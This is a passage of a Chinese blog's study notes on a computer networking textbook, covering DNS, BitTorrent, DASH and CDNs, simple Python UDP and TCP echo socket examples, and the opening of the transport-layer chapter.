<p>用户代理就是普通的浏览器。用户使用HTTP从邮件服务器中获取邮件，同时，<strong>用户也使用HTTP将邮件发送到邮件服务器</strong>。但邮件服务器之间，仍然使用SMTP进行通信。</p>
<h2 id="4-目录服务与-DNS-协议"><a href="#4-目录服务与-DNS-协议" class="headerlink" title="4. 目录服务与 DNS 协议"></a>4. 目录服务与 DNS 协议</h2><p>众所周知，因特网上的主机，由<strong>IP地址</strong>标识。所谓IP地址，是由四个<code>0~255</code>内的十进制数组成，通过<code>.</code>分隔，如：<code>192.168.0.1</code>。</p>
<p>但是，对于人类来说，要记住这么一串无特征的数字，是十分困难的。于是，出现了另一种标识主机的方法——**域名&#x2F;主机名(hostname)**，如：<code>www.baidu.com</code>。</p>
<p>那么，如何将主机名映射到对应的IP地址呢？这就是<strong>域名系统(Domain Name System, DNS)</strong> 的主要任务了。</p>
<p>DNS包括两部分：</p>
<ol>
<li>由分层的<strong>DNS服务器</strong>实现的分布式数据库；</li>
<li>属于<strong>应用层的DNS协议</strong>，它运行在<strong>UDP</strong>之上，发送和接受的报文都经过<strong>53号端口</strong>。</li>
</ol>
<h3 id="4-1-Services-Provided-by-DNS-DNS-提供的服务"><a href="#4-1-Services-Provided-by-DNS-DNS-提供的服务" class="headerlink" title="4.1. Services Provided by DNS(DNS 提供的服务)"></a>4.1. Services Provided by DNS(DNS 提供的服务)</h3><p>DNS通常是由其它应用层协议所使用的，包括HTTP、SMTP和FTP等协议。</p>
<p>DNS所提供的服务，主要包括：</p>
<ul>
<li><p><strong>将主机名（域名）解析为IP地址</strong>。例如，用户主机需要向<code>www.example.com</code>服务器发送HTTP请求，它必须先获得<code>www.example.com</code>的IP地址，其过程如下：</p>
<ol>
<li>用户主机上运行着DNS应用的客户端。</li>
<li>浏览器从URL中抽取主机名<code>www.example.com</code>，传给DNS应用的客户端。</li>
<li>DNS客户向DNS服务器发送一个包含主机名的请求。</li>
<li>DNS客户端最终会收到一份回答报文，其中包含主机对应的IP地址。</li>
<li>一旦浏览器接收到IP地址，它就能向位于该IP地址80端口的HTTP服务器进程发起一个TCP连接。</li>
</ol>
</li>
<li><p>**主机别名(host aliasing)<strong>。例如，一台名为<code>relay1.west-coast.enterprise.com</code>的主机，可能还有两个别名：<code>enterprise.com</code>和<code>www.enterprise.com</code>。此时，<code>relay1.west-coast.enterprise.com</code>则被称为</strong>规范主机名(canonical hostname)**。应用程序调用DNS可以获得主机别名对应的规范主机名，和主机IP地址。</p>
</li>
<li><p>**邮件服务器别名(mail server aliasing)**。电子邮件应用程序可以调用DNS，解析对应的主机名（比如：<code>@qq.com</code>中的<code>qq.com</code>），以获得该主机的规范主机名和IP地址。</p>
</li>
<li><p><strong>负载分配(load distribution)<strong>。繁忙的站点（比如：<code>taobao.com</code>）通常拥有多台服务器，每个都有着不同的IP地址。在DNS服务器中，一个</strong>IP地址集合</strong>与同一个规范主机名相联系，在每次回答中，循环响应这些IP地址。从而实现负载分配。</p>
</li>
</ul>
<h3 id="4-2-Overview-of-How-DNS-Works-DNS-工作机制概述"><a href="#4-2-Overview-of-How-DNS-Works-DNS-工作机制概述" class="headerlink" title="4.2. Overview of How DNS Works(DNS 工作机制概述)"></a>4.2. Overview of How DNS Works(DNS 工作机制概述)</h3><blockquote>
<p>DNS是一个在因特网上实现分布式数据库的优秀范例。</p>
</blockquote>
<h4 id="4-2-1-A-Distributed-Hierarchical-Database-分布式、层次数据库"><a href="#4-2-1-A-Distributed-Hierarchical-Database-分布式、层次数据库" class="headerlink" title="4.2.1. A Distributed, Hierarchical Database(分布式、层次数据库)"></a>4.2.1. A Distributed, Hierarchical Database(分布式、层次数据库)</h4><p>按层次分，可分为三类DNS服务器：</p>
<ul>
<li><p>**根DNS服务器(Root DNS Servers)**。全球有400多个根服务器<code>[Root Servers 2016]</code>，它会提供TLD服务器的IP地址。</p>
<p><img src="/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC2%E7%AB%A0%E5%BA%94%E7%94%A8%E5%B1%82/14.png" alt="pic"></p>
</li>
<li><p>**顶级域DNS服务器(top-level domain, TLD)**。对于每个顶级域（如：com、org、net、edu等）和国家级的顶级域（如：uk、fr、jp等），都有TLD服务器，它们会提供权威DNS服务器的IP地址。</p>
</li>
<li><p>**权威DNS服务器(authoritative DNS servers)**。一个权威DNS服务器中，收藏了一个主域名及其子域名的主机IP地址，如：<code>qq.com</code>的权威服务器知道<code>mail.qq.com</code>、<code>lol.qq.com</code>、<code>music.qq.com</code>等主机的IP地址。一个组织机构可以实现自己的权威服务器以保存记录；也可以将自己的记录储存在服务提供商的一个权威服务器中。</p>
</li>
</ul>
<p><img src="/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC2%E7%AB%A0%E5%BA%94%E7%94%A8%E5%B1%82/13.png" alt="pic"></p>
<p>除了三大DNS服务器，还有另一类重要的DNS服务器——**本地DNS服务器(local DNS server)**。每个ISP都有一台或多台本地DNS服务器，它负责将DNS转发出去。</p>
<p>DNS查询通常有两种方式：</p>
<ul>
<li>**迭代查询(iterative queries)**。假设主机<code>cse.nyu.edu</code>想知道主机<code>gaia.cs.umass.edu</code>的IP地址，其过程如图：</li>
</ul>
<p><img src="/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC2%E7%AB%A0%E5%BA%94%E7%94%A8%E5%B1%82/15.png" alt="pic"></p>
<ul>
<li><strong>递归查询(recursive queries)</strong></li>
</ul>
<p><img src="/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC2%E7%AB%A0%E5%BA%94%E7%94%A8%E5%B1%82/16.png" alt="pic"></p>
<h4 id="4-2-2-DNS-Caching-DNS-缓存"><a href="#4-2-2-DNS-Caching-DNS-缓存" class="headerlink" title="4.2.2. DNS Caching(DNS 缓存)"></a>4.2.2. DNS Caching(DNS 缓存)</h4><p>通常本地DNS服务器会缓存查询过的DNS记录。</p>
<p>缓存的好处就不多说了。</p>
<h3 id="4-3-DNS-Records-and-Messages-DNS-记录和报文"><a href="#4-3-DNS-Records-and-Messages-DNS-记录和报文" class="headerlink" title="4.3. DNS Records and Messages(DNS 记录和报文)"></a>4.3. DNS Records and Messages(DNS 记录和报文)</h3><h4 id="4-3-1-DNS-记录"><a href="#4-3-1-DNS-记录" class="headerlink" title="4.3.1. DNS 记录"></a>4.3.1. DNS 记录</h4><p>DNS服务器存储了**资源记录(Rescourece Record, RR)**，它提供了主机名到IP地址的映射，每个DNS回答报文包含了一条或多条资源记录。</p>
<p>资源记录是一个如下的<strong>4元组</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">(Name, Value, <span class="type">Type</span>, TTL)</span><br></pre></td></tr></table></figure>

<ul>
<li><code>TLL</code>，该记录的生存时间，决定了资源记录应当从缓存中删除的时间。</li>
<li><code>Type</code>，记录类型，它决定了<code>Name</code>和<code>Value</code>的值：<ul>
<li><code>Type = A</code>，则<code>Name</code>是主机名，<code>Value</code>是主机名对应的IP地址。例如：<code>(relay.example.com, 145.37.93.126, A, xxx)</code>。</li>
<li><code>Type = NS</code>，则<code>Name</code>是一个主域名（如：<code>qq.com</code>），而<code>Value</code>是该域的<strong>权威DNS服务器的主机名</strong>。例如：<code>(foo.com, dns.foo.com, NS, xxx)</code>，它通常与<code>(dns.foo.com, 128.119.43.111, A, xxx)</code>一起返回。</li>
<li><code>Type = CNAME</code>，则<code>Name</code>是一个别名，<code>Value</code>是对应的规范主机名。例如：<code>(foo.com, relay1.bar.foo.com, CNAME, xxx)</code>。</li>
<li><code>Type = MX</code>，<code>Name</code>是一个别名，指向邮件服务器，<code>Value</code>是对应的规范主机名。例如：<code>(foo.com, mail.bar.foo.com, MX, xxx)</code>。</li>
</ul>
</li>
</ul>
<p>（以上所有主机名和IP地址都是瞎编的。。。）</p>
<h4 id="4-3-2-DNS-报文"><a href="#4-3-2-DNS-报文" class="headerlink" title="4.3.2. DNS 报文"></a>4.3.2. DNS 报文</h4><p>DNS 有<strong>查询和回答报文</strong>，且两种报文<strong>格式相同</strong>，如下：</p>
<p><img src="/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC2%E7%AB%A0%E5%BA%94%E7%94%A8%E5%B1%82/17.png" alt="pic"></p>
<ul>
<li><p><strong>首部区域</strong>，前12个字节：</p>
<ul>
<li><strong>标识符</strong>，用于标识该查询，会被复制到对应查询的回答报文中，以便用户<strong>匹配发送的请求和接受的回答</strong>（我猜是因为UDP的特殊性）。</li>
<li><strong>标志</strong>，包含若干标志位：<ul>
<li>“查询&#x2F;回答” 标志位，1bit，指出是查询报文(0)还是回答报文(1)。</li>
<li>“权威” 标志位，1bit，当某DNS服务器是所请求名字的权威DNS服务器时，置1。</li>
<li>“希望递归” 标志位，1bit，如果客户在该DNS服务器没有该记录时希望它执行递归查询，置1。</li>
<li>“递归可用” 标志位，1bit，如果该DNS服务器支持递归查询，在它的回答报文中，会被置1。</li>
</ul>
</li>
<li><strong>问题数</strong>、<strong>回答RR数</strong>、<strong>权威RR数</strong>、<strong>附加RR数</strong>，指出首部后的4类数据区域中的变量数。</li>
</ul>
</li>
<li><p><strong>问题区域</strong>，包含正在进行的查询信息：</p>
<ul>
<li>名字字段，正在被查询的主机名。</li>
<li>类型字段，指出正在被查询的问题类型，如：A、MX。</li>
</ul>
</li>
<li><p><strong>回答区域</strong>，包含了对最初请求的名字的资源记录，可以包含多条RR。</p>
</li>
<li><p><strong>权威区域</strong>，包含了其它权威服务器的记录。</p>
</li>
<li><p><strong>附加区域</strong>，包含了其它有帮助的信息。例如，一个MX请求的回答报文的回答区域中，包含了一条提供邮件服务器规范主机名的资源记录；而附加区域中，则包含了一条提供该规范主机名的IP地址的A类型RR。</p>
</li>
</ul>
<h4 id="4-3-3-在-DNS-数据库中插入你的记录"><a href="#4-3-3-在-DNS-数据库中插入你的记录" class="headerlink" title="4.3.3. 在 DNS 数据库中插入你的记录"></a>4.3.3. 在 DNS 数据库中插入你的记录</h4><ol>
<li><p>首先，<del>你需要有钱</del>你需要在注册登记机构注册域名，你也可以在阿里云、腾讯云中购买域名，它们会帮你注册。</p>
</li>
<li><p>你需要向机构提供你的权威DNS服务器的主机名和IP地址，机构会将一个类型NS和一个类型A的记录插入TLD服务器中，如：</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">(foo.com, dns.foo.com, NS, xxx)</span><br><span class="line">(dns.foo.com, <span class="number">128.119</span><span class="number">.43</span><span class="number">.111</span>, A, xxx)</span><br></pre></td></tr></table></figure>
</li>
<li><p>在你的权威DNS服务器中插入你需要的记录。比如：</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">(www.foo.com, <span class="number">128.119</span><span class="number">.43</span><span class="number">.231</span>, A, xxx)</span><br><span class="line">(study.foo.com, <span class="number">128.119</span><span class="number">.43</span><span class="number">.245</span>, A, xxx)</span><br></pre></td></tr></table></figure>
</li>
<li><p>如果你<del>没钱搭建</del>没有权威服务器，你也可以跳过2、3步，将记录存储在服务提供商的权威服务器中，如阿里云、腾讯云提供的域名解析。</p>
</li>
</ol>
<h2 id="5-Peer-to-Peer-File-Distribution-P2P-文件分发"><a href="#5-Peer-to-Peer-File-Distribution-P2P-文件分发" class="headerlink" title="5. Peer-to-Peer File Distribution(P2P 文件分发)"></a>5. Peer-to-Peer File Distribution(P2P 文件分发)</h2><h3 id="5-1-P2P-体系与客户-服务器体系对比"><a href="#5-1-P2P-体系与客户-服务器体系对比" class="headerlink" title="5.1. P2P 体系与客户-服务器体系对比"></a>5.1. P2P 体系与客户-服务器体系对比</h3><p><img src="/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC2%E7%AB%A0%E5%BA%94%E7%94%A8%E5%B1%82/18.png" alt="pic"></p>
<p><code>N</code>-对等方数量</p>
<p>由图可知，P2P体系结构最小分发时间总是小于客户-服务器体系结构。</p>
<h3 id="5-2-BitTorrent"><a href="#5-2-BitTorrent" class="headerlink" title="5.2. BitTorrent"></a>5.2. BitTorrent</h3><p>到2016年止，最为流行的P2P文件分发协议是<code>BitTorrent</code>。</p>
<p>参与一个特定文件分发的所有对等方的集合被称为一个**洪流(torrent)<strong>，在一个洪流中的对等方彼此下载等长度的</strong>文件块(chunk)**，典型的长度为256KB。</p>
<p>当一个对等方首次加入一个洪流时，他没有块。随着时间流逝，它累积了越来越多的块。当它下载块时，也为其它对等方上载了多个块。一旦某个对等方获得了整个文件，他也许会自私地离开，也许会无私地留在洪流中向其它对等方上载块。</p>
<p>因为<code>BitTorrent</code>是一个复杂的协议，所以我们将仅描述它最重要的机制：</p>
<ul>
<li>每个洪流具有一个基础设施节点，称为**追踪器(tracker)**。当一个对等方加入某个洪流时，它向追踪器注册自己，并周期性地通知追踪器它仍在该洪流中。</li>
<li>当一个新的对等方A加入洪流时，追踪器会随机地从参与对等方的集合中选择对等方的一个子集，并将这些对等方的IP地址发送给A。A试图与该IP地址列表上所有的对等方创建并行的TCP连接。我们称所有与A创建TCP连接的对等方为<strong>邻近对等方</strong>，邻近对等方会随着时间而变化。</li>
<li>任意时刻，每个对等方将具有该文件的块的子集，并且不同对等方具有不同的子集。A周期性地询问每个邻近对等方它们所具有的块列表。有了这些信息，A将对当前还没有的块发出请求。</li>
</ul>
<p>任何时刻，A将具有块的子集，并知道它的邻居具有哪些块。利用这些信息，A将做出两个重要决定：1.她应当从她的邻居请求哪些块呢？2.应当向哪些向她请求块的邻居发送块？在决定过程中，A将使用两种技术：</p>
<ul>
<li><p>**最稀缺优先(rarest first)**：针对她没有的块，最稀缺块是指那些在她邻居中副本数量最少的块，她会优先请求那些最稀缺块。目的是均衡每个块在洪流中的副本数量。</p>
</li>
<li><p><strong>对换算法</strong>：A根据当前能够以最高速率向她提供数据的邻居，给出其优先权。以最高速率流入的4个邻居，被称为<strong>疏通(unchoked)<strong>。每过30秒，她要随机选择另一个邻居B，并向其发送块。因为A正在向B发送数据，她可能成为B前4位上载者之一。这样，B将开始向A发送数据，如果B发送速率够高，B也将成为A的前4位上载者。换而言之，</strong>每过30秒A将随机地选择一名新的对换伴侣，并与其对换。如果这两个对等方都满足彼此，它们将对方放入前4位列表中，并继续与对方对换，直到它们发现更好的伴侣为止。</strong></p>
</li>
</ul>
<h2 id="6-Video-Streaming-and-Content-Distribution-Networks-视频流和-CDN"><a href="#6-Video-Streaming-and-Content-Distribution-Networks-视频流和-CDN" class="headerlink" title="6. Video Streaming and Content Distribution Networks(视频流和 CDN)"></a>6. Video Streaming and Content Distribution Networks(视频流和 CDN)</h2><h3 id="6-1-Internet-Video"><a href="#6-1-Internet-Video" class="headerlink" title="6.1. Internet Video"></a>6.1. Internet Video</h3><p>视频的一个重要特征是它能够被压缩，因此可以用<strong>比特率</strong>来衡量视频质量。</p>
<p>比特率越高，图像质量越好。其实，比特率就是我们<del>看片</del>看视频时，选择的视频清晰度：360P、720P、1080P。</p>
<h3 id="6-2-HTTP流-和-DASH"><a href="#6-2-HTTP流-和-DASH" class="headerlink" title="6.2. HTTP流 和 DASH"></a>6.2. HTTP流 和 DASH</h3><p>在HTTP流中，视频只是存储在HTTP服务器中的一个普通文件，有特定的URL。用户通过HTTP请求获取视频文件，视频的字节被收集在客户应用缓存中。一旦该缓存中的字节数量超过预先设定的门限，用户应用程序就开始播放。同时，应用程序周期性地从缓存中抓取帧，解压并展现。</p>
<p>HTTP有一个严重缺陷：所有客户收到相同编码的视频。</p>
<p>为此，人们又研发了<strong>经HTTP的动态适应性流(Dynamic Adaptive Streaming over HTTP, DASH)<strong>。在DASH中，视频编码为几个不同版本，其中每个版本具有不同的比特率。客户动态地请求来自</strong>不同版本且长度为几秒地视频段数据块</strong>。</p>
<p>DASH实现：HTTP服务器上会有一个**告示文件(manifest file)**，为每个版本提供一个 URL 及其比特率。客户先请求告示文件，然后再通过 HTTP GET 请求报文中指定URL和字节范围，一次选择一个块。在下载的同时，用户也测量接收带宽并运行一个速率决定算法来选择下次请求的块。</p>
<h3 id="6-3-CDN-x2F-内容分发网"><a href="#6-3-CDN-x2F-内容分发网" class="headerlink" title="6.3. CDN &#x2F; 内容分发网"></a>6.3. CDN &#x2F; 内容分发网</h3><p>**内容分发网(Content Distribution Network, CDN)**，是一个构建在现有网络基础之上的智能虚拟网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。</p>
<p>说简单点，<strong>CDN就是缓存</strong>。</p>
<p>CDN可以是专用CDN，即由内容提供商自己所拥有；也可以是第三方CDN。</p>
<p>CDN通常采用两种不同的服务器安置原则：</p>
<ul>
<li><p><strong>深入(Enter Deep)<strong>。该原则通过在全球的</strong>接入ISP</strong>中部署服务器集群来深入到ISP的接入网中。但因为这种高分布式设计，维护和管理集群成为一大问题。</p>
</li>
<li><p>**邀请做客(Bring Home)**。通过在少量关键位置建造大集群，以此邀请ISP来做客。被许多CDN公司所采用。</p>
</li>
</ul>
<h4 id="6-3-1-CDN-实现"><a href="#6-3-1-CDN-实现" class="headerlink" title="6.3.1. CDN 实现"></a>6.3.1. CDN 实现</h4><p>大多数CDN利用DNS来截获和重定向请求。例如：</p>
<ol>
<li>用户想观看一个URL为<code>video.example.com/V123456</code>的视频时，用户主机发送一个对于<code>video.example.com</code>的DNS请求。</li>
<li>用户的本地DNS服务器，将该DNS请求转发到<code>example</code>的权威服务器。权威服务器看到主机名中的<code>video</code>前缀，则将DNS移交给第三方CDN，它将返回一个第三方CDN域的主机名，如：<code>kingcdn.com</code>。</li>
<li>用户的本地DNS服务器则发送第二个DNS请求，此时是对<code>kingcdn.com</code>的DNS请求。</li>
<li>此时，第三方kingcdn的DNS系统，会指定一个CDN服务器，用户能够从这台服务器接收到它的内容。</li>
<li>本地DNS服务器向用户返回CDN服务器的IP地址。</li>
<li>用户获取IP地址后，向对应CDN服务器获取所需视频。</li>
</ol>
<h4 id="6-3-2-Cluster-Selection-Strategies-集群选择策略"><a href="#6-3-2-Cluster-Selection-Strategies-集群选择策略" class="headerlink" title="6.3.2. Cluster Selection Strategies(集群选择策略)"></a>6.3.2. Cluster Selection Strategies(集群选择策略)</h4><p>集群选择策略，是动态地将客户定向到CDN中的某个服务器集群或数据中心的机制，即为用户选择一个相对较近的CDN服务器集群。</p>
<p>一种简单的策略，就是指派<strong>地理上最邻近</strong>的集群。但问题是忽略了时延和带宽。</p>
<p>因而，CDN需要对集群和用户之间的时延和丢包执行周期性的<strong>实时测量</strong>。但问题是许多本地DNS服务器不会响应这些探测。</p>
<h2 id="7-Socket-Programming-Creating-Network-Applications-套接字编程"><a href="#7-Socket-Programming-Creating-Network-Applications-套接字编程" class="headerlink" title="7. Socket Programming: Creating Network Applications(套接字编程)"></a>7. Socket Programming: Creating Network Applications(套接字编程)</h2><h3 id="7-1-UDP"><a href="#7-1-UDP" class="headerlink" title="7.1. UDP"></a>7.1. UDP</h3><p>UDP客户端：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">serverName = <span class="string">&#x27;localhost&#x27;</span>    <span class="comment"># 服务端地址</span></span><br><span class="line">serverPort = <span class="number">12000</span>          <span class="comment"># 服务端端口</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建客户端套接字。AF_INET: 使用IPv4协议， SOCK_DGRAM: 使用UDP协议</span></span><br><span class="line">clientSocket = socket(AF_INET, SOCK_DGRAM)</span><br><span class="line"></span><br><span class="line">message = <span class="built_in">input</span>(<span class="string">&#x27;Input lowercase sentence: &#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 向服务端发送消息。UDP发送的每条消息，都必须附上服务端地址</span></span><br><span class="line">clientSocket.sendto(message.encode(), (serverName, serverPort))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 接收服务端的消息</span></span><br><span class="line">recvMessage, serverAddress = clientSocket.recvfrom(<span class="number">2048</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;From Server:&#x27;</span>, recvMessage.decode())</span><br><span class="line"></span><br><span class="line">clientSocket.close()</span><br></pre></td></tr></table></figure>

<p>UDP服务端：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">serverName = <span class="string">&#x27;localhost&#x27;</span>    <span class="comment"># 服务端地址</span></span><br><span class="line">serverPort = <span class="number">12000</span>          <span class="comment"># 服务端端口</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建服务端套接字。AF_INET: 使用IPv4协议，SOCK_DGRAM: 使用UDP协议</span></span><br><span class="line">serverSocket = socket(AF_INET, SOCK_DGRAM)</span><br><span class="line">serverSocket.bind((serverName, serverPort)) <span class="comment"># 将套接字绑定到之前指定的端口</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;The server in ready to receive&quot;</span>)</span><br><span class="line"><span class="comment"># 服务器将一直接收UDP报文</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    message, clientAddress = serverSocket.recvfrom(<span class="number">2048</span>) <span class="comment"># 接收客户端信息，同时获得客户端地址</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;receive: &quot;</span> + <span class="built_in">str</span>(message) + <span class="string">&quot; [from&quot;</span> + <span class="built_in">str</span>(clientAddress) + <span class="string">&quot;]&quot;</span>)</span><br><span class="line">    retMessage = message.upper() <span class="comment"># 将客户端发来的字符串变为大写</span></span><br><span class="line">    serverSocket.sendto(retMessage, clientAddress)  <span class="comment"># 通过已经获得的客户端地址，将修改后的字符串发回客户端</span></span><br></pre></td></tr></table></figure>

<h3 id="7-2-TCP"><a href="#7-2-TCP" class="headerlink" title="7.2. TCP"></a>7.2. TCP</h3><p>TCP客户端：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">serverName = <span class="string">&#x27;localhost&#x27;</span>    <span class="comment"># 服务端地址</span></span><br><span class="line">serverPort = <span class="number">12000</span>          <span class="comment"># 服务端端口</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建客户端套接字。AF_INET: 使用IPv4协议， SOCK_STREAM: 使用TCP协议</span></span><br><span class="line">clientSocket = socket(AF_INET, SOCK_STREAM)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 向服务端发起连接</span></span><br><span class="line">clientSocket.connect((serverName, serverPort))</span><br><span class="line"></span><br><span class="line">message = <span class="built_in">input</span>(<span class="string">&#x27;Input lowercase sentence: &#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将信息发送到服务器</span></span><br><span class="line">clientSocket.send(message.encode())</span><br><span class="line"></span><br><span class="line"><span class="comment"># 从服务器接收信息</span></span><br><span class="line">recvMessage = clientSocket.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;From Server:&#x27;</span>, recvMessage.decode())</span><br><span class="line"></span><br><span class="line"><span class="comment"># 关闭套接字</span></span><br><span class="line">clientSocket.close()</span><br></pre></td></tr></table></figure>

<p>TCP服务端：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">serverName = <span class="string">&#x27;localhost&#x27;</span>    <span class="comment"># 服务端地址</span></span><br><span class="line">serverPort = <span class="number">12000</span>          <span class="comment"># 服务端端口</span></span><br><span class="line"></span><br><span class="line">serverSocket = socket(AF_INET, SOCK_STREAM)</span><br><span class="line">serverSocket.bind((serverName, serverPort))</span><br><span class="line">serverSocket.listen(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;The server is ready to receive&#x27;</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="comment"># 服务端接收到客户端连接请求后，为新客户创建一个特定的套接字。只支持单个用户</span></span><br><span class="line">    connSocket, clientAddress = serverSocket.accept()</span><br><span class="line">    message = connSocket.recv(<span class="number">1024</span>).decode()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;receive: &quot;</span> + <span class="built_in">str</span>(message) + <span class="string">&quot; [from&quot;</span> + <span class="built_in">str</span>(clientAddress) + <span class="string">&quot;]&quot;</span>)</span><br><span class="line">    retMessage = message.upper()</span><br><span class="line">    connSocket.send(retMessage.encode())</span><br><span class="line">    connSocket.close()</span><br><span class="line"></span><br><span class="line">    time.sleep(<span class="number">20</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">input</span>(<span class="string">&#x27;press q to quit or other to continue:&#x27;</span>) == <span class="string">&#x27;q&#x27;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>九层之台，起于累土</category>
        <category>计算机网络</category>
      </categories>
      <tags>
        <tag>计算机网络</tag>
      </tags>
  </entry>
  <entry>
    <title>《计算机网络》笔记-第3章运输层</title>
    <url>/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC3%E7%AB%A0%E8%BF%90%E8%BE%93%E5%B1%82.html</url>
    <content><![CDATA[<p>[TOC]</p>
<h2 id="0-前言"><a href="#0-前言" class="headerlink" title="0. 前言"></a>0. 前言</h2><blockquote>
<p>Chapter 3 Transport Layer</p>
</blockquote>
<p>应用层处理应用之间的通信，而运输层则负责：把同台主机上各进程发送的数据<strong>收集</strong>起来交给网络层，并将从网络层收到的数据<strong>分发</strong>给各进程。</p>
<p>与此同时，运输层的TCP协议还向应用层提供了极其重要的<strong>可靠数据传输</strong>。</p>
<span id="more"></span>

<h2 id="1-Introduction-and-Transport-Layer-Services-概述和运输层服务"><a href="#1-Introduction-and-Transport-Layer-Services-概述和运输层服务" class="headerlink" title="1. Introduction and Transport-Layer Services(概述和运输层服务)"></a>1. Introduction and Transport-Layer Services(概述和运输层服务)</h2><p>运输层接收<strong>应用层传来的应用报文</strong>，划分为较小的块，转换成运输层分组，称为<strong>运输层报文段（segment）</strong>。</p>
<p>运输层 vs 网络层：</p>
<ul>
<li>运输层提供不同主机上进程之间的通信</li>
<li>网络层提供主机之间的通信</li>
</ul>
<p>将主机间交付扩展到进程间交付，被称为<strong>运输层的多路复用（transport-layer multiplexing）和多路分解（demultiplexing）</strong>。</p>
<p>因特网运输层的主要协议和提供的服务如下：</p>
<ul>
<li><strong>UDP（用户数据报协议）</strong>：<ul>
<li>进程到进程的数据交付</li>
<li>差错检查</li>
</ul>
</li>
<li><strong>TCP（传输控制协议）</strong>：<ul>
<li>进程到进程的数据交付</li>
<li>差错检查</li>
<li>可靠数据传输</li>
<li>拥塞控制</li>
</ul>
</li>
</ul>
<h2 id="2-Multiplexing-and-Demultiplexing-多路复用和多路分解"><a href="#2-Multiplexing-and-Demultiplexing-多路复用和多路分解" class="headerlink" title="2. Multiplexing and Demultiplexing(多路复用和多路分解)"></a>2. Multiplexing and Demultiplexing(多路复用和多路分解)</h2><h3 id="2-1-套接字"><a href="#2-1-套接字" class="headerlink" title="2.1. 套接字"></a>2.1. 套接字</h3><p>在第2章，我们知道，套接字是<strong>应用层与运输层之间的接口</strong>。</p>
<p>发送数据时，应用层通过套接字将数据交付给运输层；运输层从网络层接收数据时，它需要将所接收的数据发给对应的套接字，从而到达应用层。</p>
<p>任一时刻，主机上可能有不止一个套接字，<strong>每个套接字都有唯一的标识符</strong>，其格式取决于它是UDP还是TCP。</p>
<p>将运输层报文段中的数据交付到正确的套接字的工作称为<strong>多路分解（demultiplexing）</strong>；从不同套接字接收数据，并为每个数据块封装上首部信息从而生成报文段，然后将报文段传给网络层，这些工作称为<strong>多路复用（multiplexing）</strong>。</p>
<p><img src="/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC3%E7%AB%A0%E8%BF%90%E8%BE%93%E5%B1%82/1.png" alt="pic"></p>
<p><strong>值得注意的是：一个进程通常有一个或多个套接字，例如：当今高性能Web服务器（HTTP服务器）只使用一个进程，但为每个新的客户连接创建一个具有套接字的新线程。</strong></p>
<h3 id="2-2-无连接（UDP）的多路复用和多路分解"><a href="#2-2-无连接（UDP）的多路复用和多路分解" class="headerlink" title="2.2. 无连接（UDP）的多路复用和多路分解"></a>2.2. 无连接（UDP）的多路复用和多路分解</h3><p>一个 <strong>UDP套接字</strong> 由 <strong>（目的IP地址，目的端口号）组成的二元组</strong> 标识。</p>
<p><strong>因此</strong>：如果两个UDP报文段有<strong>不同的源IP地址或源端口号</strong>，但具有<strong>相同的目的IP地址和目的端口号</strong>，那么这两个报文段将通过<strong>相同的目的套接字</strong>，定向到相同的进程。</p>
